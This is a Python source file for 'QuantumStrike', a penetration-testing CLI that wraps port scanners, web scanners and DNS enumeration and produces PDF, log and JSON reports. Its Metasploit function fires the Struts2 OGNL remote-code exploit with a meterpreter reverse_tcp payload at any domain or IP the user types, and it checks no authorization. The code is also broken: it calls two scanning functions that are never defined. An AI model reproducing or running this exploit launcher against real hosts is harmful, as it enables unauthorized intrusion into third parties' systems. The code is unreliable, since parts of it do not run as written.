import argparse
import os
import subprocess
import requests
import asyncio
from fpdf import FPDF
from rich.console import Console
import questionary
from pymetasploit3.msfrpc import MsfRpcClient
import re
import logging
import json
from datetime import datetime

console = Console()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

CONFIG = {
    "api_keys": {
        "vulners": os.getenv("VULNERS_API_KEY", "your_vulners_api_key"),
        "shodan": os.getenv("SHODAN_API_KEY", "your_shodan_api_key"),
        "chatgpt": os.getenv("OPENAI_API_KEY", "your_openai_api_key"),
    },
    "metasploit": {
        "username": os.getenv("MSF_USERNAME", "msf"),
        "password": os.getenv("MSF_PASSWORD", "msfpass"),
    },
    "output_dir": "output",
}

os.makedirs(CONFIG["output_dir"], exist_ok=True)

def banner():
    console.print(
        "[bold blue]"
        " ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗\n"
        "██╔═══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝\n"
        "██║   ██║██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  \n"
        "██║▄▄ ██║██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  \n"
        "╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║   ██║   ██║  ██║██║██║  ██╗███████╗\n"
        " ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝\n"
        "[bold yellow]Version 7.0 - QuantumStrike CLI[/bold yellow]"
    )

def execute_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        logging.error(f"Command '{' '.join(command)}' failed: {e.stderr}")
        return None

def validate_target(target):
    if not re.match(r"^(\d{1,3}\.){3}\d{1,3}$|^(([a-zA-Z0-9-_]+\.)+[a-zA-Z]{2,})$", target):
        console.print("[red]Invalid target! Please enter a valid domain or IP address.[/red]")
        return False
    return True

def parse_tool_output(output, pattern):
    parsed = []
    lines = output.split("\n")
    for line in lines:
        match = re.search(pattern, line)
        if match:
            parsed.append(match.groupdict())
    return parsed

def exploit_metasploit(target):
    console.print(f"[cyan]Attempting Metasploit exploitation on {target}...[/cyan]")
    username = CONFIG["metasploit"].get("username")
    password = CONFIG["metasploit"].get("password")

    if not username or not password:
        console.print("[red]Metasploit credentials not configured.[/red]")
        return None

    try:
        client = MsfRpcClient(password, username=username)
        exploit = client.modules.use('exploit', 'multi/http/struts2_content_type_ognl')
        exploit['RHOSTS'] = target
        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
        payload['LHOST'] = '127.0.0.1'
        payload['LPORT'] = 4444
        exploit.execute(payload=payload)
        console.print(f"[bold green]Exploitation attempt initiated on {target}. Check Metasploit for session details.[/bold green]")
        return "Exploitation initiated"
    except Exception as e:
        console.print(f"[red]Error with Metasploit: {str(e)}[/red]")
        return None

def dns_enum(target):
    console.print(f"[cyan]Performing DNS enumeration on {target}...[/cyan]")
    try:
        output = execute_command(["dig", "any", target])
        return output if output else "No DNS records found"
    except Exception as e:
        console.print(f"[red]Error during DNS enumeration: {str(e)}[/red]")
        return None

def interactive_mode():
    target = questionary.text("Enter the domain or IP address of the target:").ask()
    if not validate_target(target):
        return

    scan_tools = questionary.checkbox(
        "Select scanning tools to use:", choices=["nmap", "masscan", "nikto", "amass", "shodan", "vulners", "metasploit", "dns_enum"]
    ).ask()

    if not scan_tools:
        console.print("[red]No tools selected! Exiting interactive mode.[/red]")
        return

    scan_results = {}
    for tool in scan_tools:
        console.print(f"[cyan]Running {tool} on {target}...[/cyan]")
        if tool == "nmap":
            output = execute_command(["nmap", "-A", target])
            if output:
                scan_results["nmap"] = parse_tool_output(output, r"(?P<port>\d+/tcp)\s+(?P<state>\w+)\s+(?P<service>.+)")
        elif tool == "masscan":
            output = execute_command(["masscan", target, "-p1-65535", "--rate=1000"])
            if output:
                scan_results["masscan"] = parse_tool_output(output, r"Discovered open port (?P<port>\d+)/tcp on (?P<ip>[\d\.]+)")
        elif tool == "nikto":
            output = execute_command(["nikto", "-host", target])
            if output:
                scan_results["nikto"] = output
        elif tool == "amass":
            output = execute_command(["amass", "enum", "-passive", "-d", target])
            if output:
                scan_results["amass"] = output.split("\n")
        elif tool == "shodan":
            shodan_data = shodan_scan(target)
            if shodan_data:
                scan_results["shodan"] = shodan_data
        elif tool == "vulners":
            vuln_data = vulnerability_scan(target)
            if vuln_data:
                scan_results["vulners"] = vuln_data
        elif tool == "metasploit":
            exploit_result = exploit_metasploit(target)
            if exploit_result:
                scan_results["metasploit"] = exploit_result
        elif tool == "dns_enum":
            dns_results = dns_enum(target)
            if dns_results:
                scan_results["dns_enum"] = dns_results

    summary = summarize_scan_results(scan_results)
    console.print(summary)
    generate_report(target, scan_results)
    enhanced_logging(scan_results)
    export_to_json(scan_results, target)

def summarize_scan_results(scan_data):
    summary = []
    for tool, results in scan_data.items():
        summary.append(f"[bold yellow]{tool.upper()} Results:[/bold yellow]")
        if isinstance(results, list):
            for res in results:
                summary.append(f"- {res}")
        elif isinstance(results, dict):
            summary.append(json.dumps(results, indent=4))
        else:
            summary.append(results)
    return "\n".join(summary)

def generate_report(target, scan_data):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Helvetica", size=12)
    
    # Add title
    pdf.cell(0, 10, text=f"Penetration Testing Report: {target}", new_x="LMARGIN", new_y="NEXT", align="C")
    
    for tool, results in scan_data.items():
        pdf.set_font("Helvetica", size=12, style="B")
        pdf.cell(0, 10, text=f"{tool.upper()} Results:", new_x="LMARGIN", new_y="NEXT")
        pdf.set_font("Helvetica", size=12)
        
        if isinstance(results, list):
            for result in results:
                pdf.multi_cell(0, 10, str(result), new_x="LMARGIN", new_y="NEXT")
        elif isinstance(results, dict):
            pdf.multi_cell(0, 10, json.dumps(results, indent=4), new_x="LMARGIN", new_y="NEXT")
        else:
            pdf.multi_cell(0, 10, str(results), new_x="LMARGIN", new_y="NEXT")
    
    # Save the PDF
    filepath = os.path.join(CONFIG["output_dir"], f"{target}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
    try:
        pdf.output(filepath)
        console.print(f"[bold green]Report saved to {filepath}[/bold green]")
    except Exception as e:
        console.print(f"[bold red]Failed to save report: {str(e)}[/bold red]")

def enhanced_logging(scan_results):
    log_file = os.path.join(CONFIG["output_dir"], f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    with open(log_file, "w") as log:
        for tool, results in scan_results.items():
            log.write(f"{tool.upper()} Results:\n")
            if isinstance(results, list):
                log.writelines([f"{res}\n" for res in results])
            elif isinstance(results, dict):
                log.write(json.dumps(results, indent=4) + "\n")
            else:
                log.write(f"{results}\n")
            log.write("\n")
    console.print(f"[bold green]Detailed scan results logged to {log_file}[/bold green]")

def export_to_json(scan_results, target):
    json_file = os.path.join(CONFIG["output_dir"], f"{target}_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    try:
        with open(json_file, "w") as f:
            json.dump(scan_results, f, indent=4)
        console.print(f"[bold green]Scan results exported to JSON: {json_file}[/bold green]")
    except Exception as e:
        console.print(f"[bold red]Failed to export scan results to JSON: {str(e)}[/bold red]")

def main():
    banner()
    parser = argparse.ArgumentParser(description="QuantumStrike - Advanced Penetration Testing Tool")
    parser.add_argument("--interactive", action="store_true", help="Run in interactive mode")
    parser.add_argument("--target", type=str, help="Target domain or IP address for quick scan")
    parser.add_argument("--tool", type=str, choices=["nmap", "masscan", "nikto", "amass", "shodan", "vulners", "metasploit", "dns_enum"], help="Specific tool to run for quick scan")
    parser.add_argument("--export-json", action="store_true", help="Export scan results to JSON file")
    args = parser.parse_args()

    if args.interactive:
        interactive_mode()
    elif args.target and args.tool:
        if not validate_target(args.target):
            return
        console.print(f"[cyan]Running {args.tool} on {args.target}...[/cyan]")
        scan_results = {}
        if args.tool == "nmap":
            output = execute_command(["nmap", "-A", args.target])
            if output:
                scan_results["nmap"] = parse_tool_output(output, r"(?P<port>\d+/tcp)\s+(?P<state>\w+)\s+(?P<service>.+)")
        elif args.tool == "masscan":
            output = execute_command(["masscan", args.target, "-p1-65535", "--rate=1000"])
            if output:
                scan_results["masscan"] = parse_tool_output(output, r"Discovered open port (?P<port>\d+)/tcp on (?P<ip>[\d\.]+)")
        elif args.tool == "nikto":
            output = execute_command(["nikto", "-host", args.target])
            if output:
                scan_results["nikto"] = output
        elif args.tool == "amass":
            output = execute_command(["amass", "enum", "-passive", "-d", args.target])
            if output:
                scan_results["amass"] = output.split("\n")
        elif args.tool == "shodan":
            shodan_data = shodan_scan(args.target)
            if shodan_data:
                scan_results["shodan"] = shodan_data
        elif args.tool == "vulners":
            vuln_data = vulnerability_scan(args.target)
            if vuln_data:
                scan_results["vulners"] = vuln_data
        elif args.tool == "metasploit":
            exploit_result = exploit_metasploit(args.target)
            if exploit_result:
                scan_results["metasploit"] = exploit_result
        elif args.tool == "dns_enum":
            dns_results = dns_enum(args.target)
            if dns_results:
                scan_results["dns_enum"] = dns_results
        
        summary = summarize_scan_results(scan_results)
        console.print(summary)
        generate_report(args.target, scan_results)
        enhanced_logging(scan_results)
        if args.export_json:
            export_to_json(scan_results, args.target)
    else:
        console.print("[red]Please use --interactive or provide --target and --tool for a quick scan.[/red]")

if __name__ == "__main__":
    main()
